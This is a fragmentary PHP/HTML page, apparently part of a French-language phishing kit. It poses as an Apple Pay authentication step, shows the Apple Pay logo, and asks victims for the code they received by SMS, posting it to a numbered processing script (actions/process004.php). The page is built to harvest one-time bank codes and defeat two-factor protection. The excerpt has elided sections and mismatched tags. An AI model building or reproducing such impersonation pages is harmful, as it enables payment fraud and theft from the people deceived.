...
<form method="POST" action="actions/process004.php">
        ...
        <strong><br><center><p style="" class="title">Authentification via Apple Pay</p></strong>
          <?php
        if(isset($_GET['error']))
        {
          if($_GET['error'] == "code")
          {
            $display = "Veuillez saisir un code valide";
          }
          else{
    ...
    <p style="margin-right: 70px;">'.$display.'</p>
         ...
         ?>
          <center>
  <img src="https://woocommerce.com/wp-content/uploads/2021/04/logo-apple-pay@2x.png" style="width: 60px;margin: 20px;">
</center>

<br>
<input placeholder="Code reçu par SMS" class="form-control form-text" type="text" id="edit-listenumeroslt" name="otpcode" value="" size="60" minlength="6" maxlength="8" style="width: 200px;" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" >
